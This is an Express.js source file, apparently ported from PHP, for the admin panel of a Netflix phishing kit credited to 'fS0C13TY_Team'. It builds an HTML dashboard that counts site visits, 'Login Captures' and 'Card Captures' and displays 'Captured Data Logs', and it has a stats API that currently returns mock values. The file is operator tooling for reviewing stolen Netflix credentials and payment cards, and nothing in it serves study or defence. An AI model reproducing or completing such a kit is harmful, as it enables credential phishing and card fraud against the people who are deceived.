/**
 * Admin panel routes
 * Converted from PHP admin.php
 */

import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const router = express.Router();

// Admin panel - displays captured data
router.get('/', (req, res) => {
    const adminFilePath = path.join(__dirname, 'admin.html');

    // Check if admin file exists
    if (fs.existsSync(adminFilePath)) {
        res.sendFile(adminFilePath);
    } else {
        // Create initial admin file with sample data if it doesn't exist
        const initialContent = `<!DOCTYPE html>
<html>
<head>
    <title>fSOCIETY Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            padding: 20px;
        }
        .header {
            text-align: center;
            color: #e50914;
            margin-bottom: 30px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #333;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .logs {
            margin-top: 20px;
        }
        .log-entry {
            background: #222;
            margin: 10px 0;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #e50914;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>💖 fSOCIETY Netflix Admin Panel 🖕🤡🖕</h1>
        <p>Coded by fS0C13TY_Team</p>
    </div>

    <div class="stats">
        <div class="stat-card">
            <h3>Total Visits</h3>
            <p id="totalVisits">0</p>
        </div>
        <div class="stat-card">
            <h3>Login Captures</h3>
            <p id="loginCaptures">0</p>
        </div>
        <div class="stat-card">
            <h3>Card Captures</h3>
            <p id="cardCaptures">0</p>
        </div>
    </div>

    <div class="logs">
        <h2>Captured Data Logs</h2>
        <div id="logContainer">
            <p>No data captured yet...</p>
        </div>
    </div>

    <script>
        // Simple JavaScript to load and display logs
        function loadLogs() {
            // This would typically fetch from an API endpoint
            // For now, just show placeholder content
            console.log('Loading logs...');
        }

        // Load logs on page load
        loadLogs();
    </script>
</body>
</html>`;

        fs.writeFileSync(adminFilePath, initialContent);
        res.sendFile(adminFilePath);
    }
});

// API endpoint to get statistics
router.get('/api/stats', (req, res) => {
    // This would typically query a database
    // For now, return mock data
    res.json({
        totalVisits: 0,
        loginCaptures: 0,
        cardCaptures: 0
    });
});

export default router;